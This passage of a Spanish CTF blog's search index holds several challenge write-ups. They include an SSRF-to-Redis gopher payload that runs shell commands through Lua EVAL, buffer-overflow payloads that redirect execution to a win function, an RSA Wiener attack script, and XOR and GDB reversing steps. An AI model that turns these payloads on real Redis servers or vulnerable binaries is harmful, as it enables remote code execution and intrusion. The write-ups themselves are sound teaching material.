/:\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24178%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('ls%20%2f'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  Nótese que hay un número 178 que representa la longitud del comando EVAL. Tenemos esta salida:\nVemos que hay un archivo readflag. Vamos a ver qué tipo de archivo es mediante file /readflag (tenemos que aumentar la longitud a 188):\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24188%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('file%20%2freadflag'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  Se trata de un binario ELF, igual si lo ejecutamos obtenemos la flag. Vamos a ejecutar /readflag (tenemos que cambiar la longitud a 183):\ngopher://127.0.0.1:6379/_*3%0d%0a%244%0d%0aeval%0d%0a%24183%0d%0a%0a%0alocal%20io_l%20%3d%20package.loadlib('%2fusr%2flib%2fx86_64-linux-gnu%2fliblua5.1.so.0'%2c'luaopen_io')%3blocal%20io%3dio_l()%3blocal%20f%3dio.popen('%2freadflag'%2c'r')%3blocal%20res%3df%3aread('*a')%3bf%3aclose()%3breturn%20res%0a%0a%0d%0a%241%0d%0a0%0d%0a*1%0d%0a%244%0d%0aquit%0d%0a  Y ahí está: HTB{r3d_h4nd5_t0_th3_r3disland!}.\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/red-island/","section":"ctf","summary":"SSRF. Navegación de directorios. Protocolo Gopher. RCE en Redis","time":3,"title":"Red Island"},{"contents":"Se nos proporciona un archivo PDF llamado Financial_Report_for_ABC_Labs.pdf. Este muestra algo de texto:\nPero vemos que hay palabras que se han ocultado utilizando una especie de \u0026ldquo;color de fondo\u0026rdquo; negro. Sin embargo, podemos usar el ratón para selecctionar el texto, y ahí está la flag:\nFinancial Report for ABC Labs, Kigali, Rwanda for the year 2021. Breakdown - Just painted over in MS word. Cost Benefit Analysis Credit Debit This is not the flag, keep looking Expenses from the picoCTF{C4n_Y0u_S33_m3_fully} Redacted document.  ","image":"/images/forensics.png","permalink":"https://7rocky.github.io/ctf/picoctf/forensics/redaction-gone-wrong/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Texto oculto en PDF","time":0,"title":"Redaction gone wrong"},{"contents":"Se nos proporciona un archivo binario llamado reflection:\n$ file reflection reflection: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d57b0acdb0fda3fe599c48fa63ca61e7694b8b60, for GNU/Linux 3.2.0, not stripped  Si abrimos Ghidra y echamos un vistazo al código fuente en C descompilado, veremos la función main:\nundefined8 main() { longj; char*__format; byte flag_input[100]; intk; int_j; int_length; inti; intlength; printf(\"\u0026gt;\u0026gt;\u0026gt; \"); fgets((char*) flag_input, 100, stdin); _length =0; _j =0; k =0; while(true) { length =_length; i =_j; j =(long)_j; _j =_j +1; if((flag[j] ^flag_input[i]) !=*(byte *) ((long) k +0x100000)) break; _length =_length +1; if(64\u0026lt;length) break; do{ k =k +1; } while(*(char*) ((long) k +0x100000) =='\\0'); } if(_length ==65) { __format =\"yes\"; } else{ __format =\"no\"; } printf(__format); return0; }  El programa espera que pongamos la flag y utiliza XOR para cifrar la flag y la compara con datos almacenados en el binario. Específicamente, la comparación se realiza con la cabecera ELF (los primeros 65 bytes, omitiendo los bytes nulos).\nEl símbolo global flag está en la dirección 0x4060:\n$ readelf -s reflection | grep flag 68: 0000000000004060 65 OBJECT GLOBAL DEFAULT 25 flag  Podemos mirar los bytes con xxd (pero hay que restar 0x1000, ya que el binario no está cargado):\n$ xxd reflection | grep -A 4 3060: 00003060: 1626 3820 7965 6867 6178 0f65 1f9b 542f .\u00268 yehgax.e..T/ 00003070: 4f52 3477 7f72 5b26 352e bb76 b16d 665c OR4w.r[\u00265..v.mf\\ 00003080: 6a79 6e7d 7047 626e 795e 6b71 0372 2f76 jyn}pGbny^kq.r/v 00003090: 7f68 6b64 7562 ee5d e96d 4f62 6b44 451f .hkdub.].mObkDE. 000030a0: 2547 4343 3a20 2844 6562 6961 6e20 3130 %GCC: (Debian 10  Y podemos extraer los primeros 65 bytes (130 dígitos hexadecimales) como sigue:\n$ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 \u00268 yehgaxeT/OR4wr[\u00265.vmf\\jyn}pGbny^kqr/vhkdub]mObkDE%GCC: (Debian 10 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d 665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f62 6b44451f254743433a202844656269616e203130 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p | tr -d \\\\n 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f254743433a202844656269616e203130 $ xxd reflection | grep -A 4 3060: | xxd -r | tail -c 80 | xxd -p | tr -d \\\\n | cut -b-130 162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f25  Y podemos realizar operaciones similares para obtener los primeros 65 bytes de la cabecera ELF sin bytes nulos:\n$ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d802 0803041803180318031c1c010104700670061001051010109d029d021001 0420202058015801100106e82de83de83db902d802100206f82df83df83d e001e00108040438033803 $ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p | tr -d \\\\n 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058015801100106e82de83de83db902d802100206f82df83df83de001e00108040438033803 $ xxd reflection | head -30 | xxd -r | tr -d \\\\0 | xxd -p | tr -d \\\\n | cut -b-130 7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058  Finalmente, podemos aplicar XOR para cifrar ambos payloads y extraer la flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; from pwn import xor \u0026gt;\u0026gt;\u0026gt; a = bytes.fromhex('7f454c46020101033e01601040f03a40380d401f1e0604404040d802d8020803041803180318031c1c010104700670061001051010109d029d0210010420202058') \u0026gt;\u0026gt;\u0026gt; b = bytes.fromhex('162638207965686761780f651f9b542f4f5234777f725b26352ebb76b16d665c6a796e7d7047626e795e6b7103722f767f686b647562ee5de96d4f626b44451f25') \u0026gt;\u0026gt;\u0026gt; xor(a, b) b'ictf{did_you_know_that_function_names_are_just_pointers_to_code?}' \u0026gt;\u0026gt;\u0026gt; exit() $ ./reflection  ictf{did_you_know_that_function_names_are_just_pointers_to_code?} yes  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/reflection/","section":"ctf","summary":"ImaginaryCTF 12/07/2022. 75 puntos. Cifrado XOR","time":2,"title":"Reflection"},{"contents":"Se nos proporciona un binario de 64 bits llamado reg:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  Podemos utilizar Ghidra para analizar el binario y mirar el código fuente en C descompilado. Esta es la función main:\nintmain() { run(); return0; }  Vamos a ver run:\nvoidrun() { charlocal_38[48]; initialize(); printf(\"Enter your name : \"); gets(local_38); puts(\"Registered!\"); return; }  El binario es vulnerable a Buffer Overflow porque la variable llamada local_38 tiene 48 bytes asignados como buffer, pero el programa está usando gets, que es una función insegura ya que no limita la longitud de los datos de entrada, desbordando el buffer reservado si el tamaño de los datos de entrada es mayor que 48 bytes.\nPodemos verificar que el programa se rompe en esta situación:\n$ ./reg Enter your name : asdf Registered! $ python3 -c 'print(\"A\" * 100)' | ./reg Enter your name : Registered! zsh: done python3 -c 'print(\"A\" * 100)' | zsh: segmentation fault (core dumped) ./reg  El programa se rompe porque hemos sobrescrito la dirección de retorno guardada y cuando el programa intenta retornar, se encuentra con una dirección de memoria inválida.\nDebido a que tenemos un binario de 64 bits sin canario, el offset necesario para desbordar el buffer y llegar a la pila (stack) es 72 (ya que después de los 64 bytes reservados se encuentra el valor de $rbp guardado y justo después la dirección de retorno).\nDe todas formas, podemos usar un patrón con GDB para encontrar el offset:\n$ gdb -q reg Reading symbols from reg... (No debugging symbols found in reg) gef➤ pattern create 100 [+] Generating a pattern of 100 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa [+] Saved as '$_gef0' gef➤ run Starting program: /home/rocky/Desktop/HTB/Challenges/Pwn/Reg/reg Enter your name : aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa Registered! Program received signal SIGSEGV, Segmentation fault. 0x00000000004012ac in run ()  gef➤ pattern offset $rsp [+] Searching for '$rsp' [+] Found at offset 56 (little-endian search) likely [+] Found at offset 49 (big-endian search)  Mirando de nuevo al código descompilado, vemos que hay una función llamada winner:\nvoidwinner() { charlocal_418[1032]; FILE *local_10;  puts(\"Congratulations!\"); local_10 =fopen(\"flag.txt\", \"r\"); fgets(local_418, 0x400, local_10); puts(local_418); fclose(local_10); return; }  Esta función abre flag.txt y muestra el contenido.\nLa dirección de esta función es fija porque el binario no tiene protección PIE, y podemos verla con GDB, readelf y objdump:\ngef➤ p winner $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0x401206 \u0026lt;winner\u0026gt; gef➤ quit $ readelf -s reg | grep winner 75: 0000000000401206 100 FUNC GLOBAL DEFAULT 13 winner $ objdump -d reg | grep winner 0000000000401206 \u0026lt;winner\u0026gt;:  Entonces, la idea es explotar la vulnerabilidad de Buffer Overflow y modificar la dirección de retorno guardada de forma que llamemos a winner y leamos la flag. Vamos a probar en local:\n$ echo 'HTB{f4k3_fl4g_f0r_t3st1ng}' \u0026gt; flag.txt $ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 56 + p64(0x401206) + b\"\\n\")' | ./reg Enter your name : Registered! Congratulations! HTB{f4k3_fl4g_f0r_t3st1ng} zsh: done python3 -c | zsh: segmentation fault (core dumped) ./reg  Nótese que tenemos que añadir un carácter de salto de línes al final porque gets espera este carácter para parar de leer.\nGenial, vamos a probar contra la instancia remota:\n$ python3 -c 'from pwn import os, p64; os.write(1, b\"A\" * 56 + p64(0x401206) + b\"\\n\")' | nc 178.62.39.153 30785 Enter your name : Registered! Congratulations! HTB{N3W_70_pWn}  ","image":"/images/pwn.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/pwn/reg/","section":"ctf","summary":"Binario de 64 bits. Buffer Overflow. Control del flujo de ejecución del programa","time":2,"title":"Reg"},{"contents":"Se nos proporciona el código en Python utilizado para cifrar la flag:\n#!/usr/bin/env python3 fromCrypto.Util.numberimport* p=getPrime(512) q=getPrime(512) n=p * q phi=(p - 1) * (q - 1) d=getPrime(32) e=pow(d, -1, phi) m=bytes_to_long(open('flag.txt', 'rb').read()) c=pow(m, e, n) print(f'{n= }') print(f'{e= }') print(f'{c= }') ''' n = 134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e = 50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c = 133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 '''  El criptosistema utilizado es RSA, pero la implementación es errónea. El problema es que el número privado $d$ es relativamente pequeño (un número primo de 32 bits). Por tanto, podemos romper el cifrado con el ataque de Wiener.\nPodemos implementar este ataque en Python con una librería llamada owiener (que se puede instalar con pip). Una vez que tenemos $d$, podemos descifrar el texto cifrado como $m = c^d \\pmod{n}$.\nEste es el script en Python que soluciona el reto:\n#!/usr/bin/env python3 importowiener defmain(): n=134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e=50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c=133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 d=owiener.attack(e, n) m=pow(c, d, n) print(bytes.fromhex(hex(m)[2:]).decode()) if__name__=='__main__': main()  Y obtenemos la flag:\n$ python3 solve.py ictf{have_fun_at_ICTF_22!!!_559543c1}  El script completo se puede encontrar aquí: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/relatively-small-arguments/","section":"ctf","summary":"ImaginaryCTF 14/07/2022. 75 puntos. RSA. Ataque de Wiener","time":0,"title":"Relatively Small Arguments"},{"contents":"Se nos proporciona esta ristra de bits de un disco duro:\n10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101  Necesitamos representarlo en forma de caracteres legibles. Primero, podemos utilizar Python para expresar el chorros de bits como un número en hexadecimal:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; hex(0b10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101) '0x4354466c6561726e7b4269745f466c697070696e7d'  Nótese que hay que añadir 0b para que Python interprete el número con base binaria.\nMirando los dígitos en hexadecimal, podemos prever que serán caracteres ASCII (por ejemplo, 0x43 es C, 0x54 es T y 0x46 es F).\nPara decodificar estos bytes desde números en hexadecimal, podemos utilizar binascii.unhexlify (quitando el prefijo 0x):\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex('4354466c6561726e7b4269745f466c697070696e7d') b'CTFlearn{Bit_Flippin}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/reverse-polarity/","section":"ctf","summary":"Decodificación ASCII binario","time":0,"title":"Reverse Polarity"},{"contents":"Se nos proporciona un binario de 64 bits llamado Reykjavik:\n$ file Reykjavik Reykjavik: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bc04368dbcefb4491573ac8feea3a32e31ed59f, for GNU/Linux 3.2.0, not stripped  Si lo ejecutamos, vemos que necesita un argumento de línea de comandos:\n$ ./Reykjavik Usage: Reykjavik CTFlearn{flag} $ ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Sorry Dude, 'CTFlearn{flag}' is not the flag :-(  Vamos a usar GDB para depurar el programa. Primero, podemos mostrar el desensamblado de la función main:\n$ gdb -q Reykjavik Reading symbols from Reykjavik... (No debugging symbols found in Reykjavik) gef➤ disassemble main Dump of assembler code for function main: 0x00000000000010a0 \u0026lt;+0\u0026gt;: endbr64 0x00000000000010a4 \u0026lt;+4\u0026gt;: push r13 0x00000000000010a6 \u0026lt;+6\u0026gt;: push r12 0x00000000000010a8 \u0026lt;+8\u0026gt;: push rbp 0x00000000000010a9 \u0026lt;+9\u0026gt;: sub rsp,0x20 0x00000000000010ad \u0026lt;+13\u0026gt;: cmp edi,0x1 0x00000000000010b0 \u0026lt;+16\u0026gt;: je 0x11b5 \u0026lt;main+277\u0026gt; 0x00000000000010b6 \u0026lt;+22\u0026gt;: mov rbp,QWORD PTR [rsi+0x8] 0x00000000000010ba \u0026lt;+26\u0026gt;: mov edi,0x1 0x00000000000010bf \u0026lt;+31\u0026gt;: xor eax,eax 0x00000000000010c1 \u0026lt;+33\u0026gt;: lea rsi,[rip+0xf60] # 0x2028 0x00000000000010c8 \u0026lt;+40\u0026gt;: mov rdx,rbp 0x00000000000010cb \u0026lt;+43\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000010d0 \u0026lt;+48\u0026gt;: lea rdi,[rip+0xf91] # 0x2068 0x00000000000010d7 \u0026lt;+55\u0026gt;: call 0x1070 \u0026lt;puts@plt\u0026gt; 0x00000000000010dc \u0026lt;+60\u0026gt;: lea rdx,[rip+0xfcd] # 0x20b0 0x00000000000010e3 \u0026lt;+67\u0026gt;: mov ecx,0x20 0x00000000000010e8 \u0026lt;+72\u0026gt;: mov rsi,rbp 0x00000000000010eb \u0026lt;+75\u0026gt;: mov rdi,rdx 0x00000000000010ee \u0026lt;+78\u0026gt;: repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 0x00000000000010f0 \u0026lt;+80\u0026gt;: seta al 0x00000000000010f3 \u0026lt;+83\u0026gt;: sbb al,0x0 0x00000000000010f5 \u0026lt;+85\u0026gt;: test al,al 0x00000000000010f7 \u0026lt;+87\u0026gt;: je 0x11c9 \u0026lt;main+297\u0026gt; 0x00000000000010fd \u0026lt;+93\u0026gt;: mov rdx,QWORD PTR [rip+0x2f0c] # 0x4010 \u0026lt;data\u0026gt; 0x0000000000001104 \u0026lt;+100\u0026gt;: mov r13,rsp 0x0000000000001107 \u0026lt;+103\u0026gt;: mov rsi,rbp 0x000000000000110a \u0026lt;+106\u0026gt;: mov BYTE PTR [rsp+0x1b],0x0 0x000000000000110f \u0026lt;+111\u0026gt;: movabs rax,0xabababababababab 0x0000000000001119 \u0026lt;+121\u0026gt;: mov rdi,r13 0x000000000000111c \u0026lt;+124\u0026gt;: xor rdx,rax 0x000000000000111f \u0026lt;+127\u0026gt;: mov QWORD PTR [rsp],rdx 0x0000000000001123 \u0026lt;+131\u0026gt;: mov rdx,QWORD PTR [rip+0x2eee] # 0x4018 \u0026lt;data+8\u0026gt; 0x000000000000112a \u0026lt;+138\u0026gt;: xor rdx,rax 0x000000000000112d \u0026lt;+141\u0026gt;: xor rax,QWORD PTR [rip+0x2eec] # 0x4020 \u0026lt;data+16\u0026gt; 0x0000000000001134 \u0026lt;+148\u0026gt;: mov QWORD PTR [rsp+0x10],rax 0x0000000000001139 \u0026lt;+153\u0026gt;: movzx eax,BYTE PTR [rip+0x2ee8] # 0x4028 \u0026lt;data+24\u0026gt; 0x0000000000001140 \u0026lt;+160\u0026gt;: mov QWORD PTR [rsp+0x8],rdx 0x0000000000001145 \u0026lt;+165\u0026gt;: xor eax,0xffffffab 0x0000000000001148 \u0026lt;+168\u0026gt;: mov BYTE PTR [rsp+0x18],al 0x000000000000114c \u0026lt;+172\u0026gt;: movzx eax,BYTE PTR [rip+0x2ed6] # 0x4029 \u0026lt;data+25\u0026gt; 0x0000000000001153 \u0026lt;+179\u0026gt;: xor eax,0xffffffab 0x0000000000001156 \u0026lt;+182\u0026gt;: mov BYTE PTR [rsp+0x19],al 0x000000000000115a \u0026lt;+186\u0026gt;: movzx eax,BYTE PTR [rip+0x2ec9] # 0x402a \u0026lt;data+26\u0026gt; 0x0000000000001161 \u0026lt;+193\u0026gt;: xor eax,0xffffffab 0x0000000000001164 \u0026lt;+196\u0026gt;: mov BYTE PTR [rsp+0x1a],al 0x0000000000001168 \u0026lt;+200\u0026gt;: call 0x1080 \u0026lt;strcmp@plt\u0026gt; 0x000000000000116d \u0026lt;+205\u0026gt;: mov r12d,eax 0x0000000000001170 \u0026lt;+208\u0026gt;: test eax,eax 0x0000000000001172 \u0026lt;+210\u0026gt;: jne 0x1197 \u0026lt;main+247\u0026gt; 0x0000000000001174 \u0026lt;+212\u0026gt;: mov rdx,r13 0x0000000000001177 \u0026lt;+215\u0026gt;: lea rsi,[rip+0xf7a] # 0x20f8 0x000000000000117e \u0026lt;+222\u0026gt;: mov edi,0x1 0x0000000000001183 \u0026lt;+227\u0026gt;: xor eax,eax 0x0000000000001185 \u0026lt;+229\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x000000000000118a \u0026lt;+234\u0026gt;: add rsp,0x20 0x000000000000118e \u0026lt;+238\u0026gt;: mov eax,r12d 0x0000000000001191 \u0026lt;+241\u0026gt;: pop rbp 0x0000000000001192 \u0026lt;+242\u0026gt;: pop r12 0x0000000000001194 \u0026lt;+244\u0026gt;: pop r13 0x0000000000001196 \u0026lt;+246\u0026gt;: ret 0x0000000000001197 \u0026lt;+247\u0026gt;: mov rdx,rbp 0x000000000000119a \u0026lt;+250\u0026gt;: mov edi,0x1 0x000000000000119f \u0026lt;+255\u0026gt;: xor eax,eax 0x00000000000011a1 \u0026lt;+257\u0026gt;: mov r12d,0x4 0x00000000000011a7 \u0026lt;+263\u0026gt;: lea rsi,[rip+0xf7a] # 0x2128 0x00000000000011ae \u0026lt;+270\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000011b3 \u0026lt;+275\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; 0x00000000000011b5 \u0026lt;+277\u0026gt;: lea rdi,[rip+0xe4c] # 0x2008 0x00000000000011bc \u0026lt;+284\u0026gt;: mov r12d,0x1 0x00000000000011c2 \u0026lt;+290\u0026gt;: call 0x1070 \u0026lt;puts@plt\u0026gt; 0x00000000000011c7 \u0026lt;+295\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; 0x00000000000011c9 \u0026lt;+297\u0026gt;: lea rsi,[rip+0xf00] # 0x20d0 0x00000000000011d0 \u0026lt;+304\u0026gt;: mov edi,0x1 0x00000000000011d5 \u0026lt;+309\u0026gt;: mov r12d,0x2 0x00000000000011db \u0026lt;+315\u0026gt;: call 0x1090 \u0026lt;__printf_chk@plt\u0026gt; 0x00000000000011e0 \u0026lt;+320\u0026gt;: jmp 0x118a \u0026lt;main+234\u0026gt; End of assembler dump.  Vemos que hay una llamada a strcmp en main+200. Podemos poner un breakpoint justo ahí y ejecutar el programa:\ngef➤ break *main+200 Breakpoint 1 at 0x1168 gef➤ run 'CTFlearn{flag}' Starting program: ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Breakpoint 1, 0x0000555555555168 in main ()  Ahora que estamos en esa instrucción, podemos mostrar el primer argumento de strcmp (que está en $rdi en x64). Y vemos la flag:\ngef➤ x/s $rdi 0x7fffffffe650: \"CTFlearn{Eye_L0ve_Iceland_}\"  ","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/ctflearn/reverse-engineering/reykjavik/","section":"ctf","summary":"Depuración con GDB. Descifrado XOR","time":2,"title":"Reykjavik"},{"contents":"Se nos proporciona un binario de 32 bits llamado server:\nArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)  También tenemos el código fuente en C. Básicamente, lo que hace el programa es llamar a la función gets, que es vulnerable a Buffer Overflow:\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void win() { system(\"/bin/cat /flag.txt\"); } void vuln() { char padding[16]; char buff[32]; memset(buff, 0, sizeof(buff)); // Zero-out the buffer. memset(padding, 0xFF, sizeof(padding)); // Mark the padding with 0xff. // Initializes the stack visualization. Don't worry about it! init_visualize(buff); // Prints out the stack before modification visualize(buff); printf(\"Input some text: \"); gets(buff); // This is a vulnerable call! // Prints out the stack after modification visualize(buff); } int main() { setbuf(stdout, NULL); setbuf(stdin, NULL); vuln(); }  El objetivo del reto es redirigir el flujo de ejecución del programa para llamar a win explotando la vulnerabilidad de Buffer Overflow. De hecho, el programa está diseñado para mostrar la pila (stack) antes y después de llamar a gets:\n$ ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe40090 | 00 00 00 00 00 00 00 00 | 0xffe40098 | 00 00 00 00 00 00 00 00 | 0xffe400a0 | 00 00 00 00 00 00 00 00 | 0xffe400a8 | 00 00 00 00 00 00 00 00 | 0xffe400b0 | ff ff ff ff ff ff ff ff | 0xffe400b8 | ff ff ff ff ff ff ff ff | 0xffe400c0 | 80 25 ee f7 00 a0 04 08 | 0xffe400c8 | d8 00 e4 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: AAAA Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffe40090 | 41 41 41 41 00 00 00 00 | 0xffe40098 | 00 00 00 00 00 00 00 00 | 0xffe400a0 | 00 00 00 00 00 00 00 00 | 0xffe400a8 | 00 00 00 00 00 00 00 00 | 0xffe400b0 | ff ff ff ff ff ff ff ff | 0xffe400b8 | ff ff ff ff ff ff ff ff | 0xffe400c0 | 80 25 ee f7 00 a0 04 08 | 0xffe400c8 | d8 00 e4 ff 8b 86 04 08 | Return address: 0x0804868b  Necesitamos sobrescribir los bytes mostrados en rojo (registro $eip). Para llegar a este punto, necesitamos un total de 60 bytes. Podemos probarlo poniendo BBBB:\n$ python3 -c 'print(\"A\" * 60 + \"BBBB\")' | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xfff8b4a0 | 00 00 00 00 00 00 00 00 | 0xfff8b4a8 | 00 00 00 00 00 00 00 00 | 0xfff8b4b0 | 00 00 00 00 00 00 00 00 | 0xfff8b4b8 | 00 00 00 00 00 00 00 00 | 0xfff8b4c0 | ff ff ff ff ff ff ff ff | 0xfff8b4c8 | ff ff ff ff ff ff ff ff | 0xfff8b4d0 | 80 85 f0 f7 00 a0 04 08 | 0xfff8b4d8 | e8 b4 f8 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xfff8b4a0 | 41 41 41 41 41 41 41 41 | 0xfff8b4a8 | 41 41 41 41 41 41 41 41 | 0xfff8b4b0 | 41 41 41 41 41 41 41 41 | 0xfff8b4b8 | 41 41 41 41 41 41 41 41 | 0xfff8b4c0 | 41 41 41 41 41 41 41 41 | 0xfff8b4c8 | 41 41 41 41 41 41 41 41 | 0xfff8b4d0 | 41 41 41 41 41 41 41 41 | 0xfff8b4d8 | 41 41 41 41 42 42 42 42 | Return address: 0x42424242 zsh: done python3 -c 'print(\"A\" * 60 + \"BBBB\")' | zsh: segmentation fault (core dumped) ./server  El programa se rompe (violación de segmento) porque la dirección 0x42424242 (BBBB) es inválida.\nAhora que tenemos control sobre la siguiente instrucción a ejecutar (registro $eip), podemos poner la dirección de win. Esta dirección puede obtenerse utilizando readelf:\n$ readelf -s server | grep win 64: 08048586 43 FUNC GLOBAL DEFAULT 14 win  Este valor hexadecimal debe ser introducido en formato little-endian (bytes en orden inverso). Si queremos probarlo en local, necesitamos crear un archivo de prueba /flag.txt:\n# echo THISISTHEFLAG | tee /flag.txt THISISTHEFLAG  Y ahora podemos probar el payload:\n$ echo -e \"$(python3 -c 'print(\"A\" * 60)')\\x86\\x85\\x04\\x08\" | ./server Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffc2ea30 | 00 00 00 00 00 00 00 00 | 0xffc2ea38 | 00 00 00 00 00 00 00 00 | 0xffc2ea40 | 00 00 00 00 00 00 00 00 | 0xffc2ea48 | 00 00 00 00 00 00 00 00 | 0xffc2ea50 | ff ff ff ff ff ff ff ff | 0xffc2ea58 | ff ff ff ff ff ff ff ff | 0xffc2ea60 | 80 d5 f7 f7 00 a0 04 08 | 0xffc2ea68 | 78 ea c2 ff 8b 86 04 08 | Return address: 0x0804868b Input some text: Legend: buff MODIFIED padding MODIFIED notsecret MODIFIED secret MODIFIED return address MODIFIED 0xffc2ea30 | 41 41 41 41 41 41 41 41 | 0xffc2ea38 | 41 41 41 41 41 41 41 41 | 0xffc2ea40 | 41 41 41 41 41 41 41 41 | 0xffc2ea48 | 41 41 41 41 41 41 41 41 | 0xffc2ea50 | 41 41 41 41 41 41 41 41 | 0xffc2ea58 | 41 41 41 41 41 41 41 41 | 0xffc2ea60 | 41 41 41 41 41 41 41 41 | 0xffc2ea68 | 41 41 41 41 86 85 04 08 | Return address: 0x08048586 THISISTHEFLAG zsh: done echo -e \"$(python3 -c 'print(chr(0x41) * 60)')\\x86\\x85\\x04\\x08\" | zsh: segmentation fault (core dumped) ./server  Perfecto, hemos llamado a win correctamente. Ahora podemos conseguir la flag en la instancia remota:\n$ echo -e \"$(python3 -c 'print(\"A\" * 